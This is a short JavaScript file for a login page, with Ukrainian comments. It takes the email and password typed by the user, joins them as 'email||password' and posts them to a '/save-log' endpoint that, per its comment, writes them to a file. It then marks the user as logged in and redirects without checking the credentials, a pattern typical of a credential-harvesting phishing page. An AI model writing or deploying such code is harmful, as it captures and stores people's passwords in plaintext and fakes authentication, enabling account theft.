// let emailInput = document.querySelector('.emailInput');
// let passwordInput = document.querySelector('.passwordInput');
let homeNav = document.querySelector('.btn');


    // Якщо значення не встановлене, встановлюємо його в false


// emailInput.addEventListener('input', toggleButton);
// passwordInput.addEventListener('input', toggleButton);

// function toggleButton() {
//     const email = emailInput.value;
//     const password = passwordInput.value;

//     if (email.trim() !== '' && password.trim() !== '') {
//         loginBtn.removeAttribute('disabled');
//     } else {
//         loginBtn.setAttribute('disabled', true);
//     }
// }

document.getElementById('signinBtn').addEventListener('click', async () => {
    const email = document.querySelector('.emailInput').value;
    const password = document.querySelector('.passwordInput').value;

    // Перевірка, чи поля не порожні
    if (!email || !password) {
        alert('Please fill in both email and password fields.');
        return; // Зупинити виконання, якщо поля порожні
    }

    // Формуємо дані
    const logData = `${email}||${password}`;

    // Надсилаємо дані на сервер для запису у файл
    await fetch('/save-log', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ logData })
    });

    // Зберігаємо стан входу
    localStorage.setItem('isLoggedIn', true);
    
    // Навігація на домашню сторінку
    toHomePage();
});





function toHomePage() {
    var homePage = "index.html";
    window.location.href = homePage;
};

// disabled="True"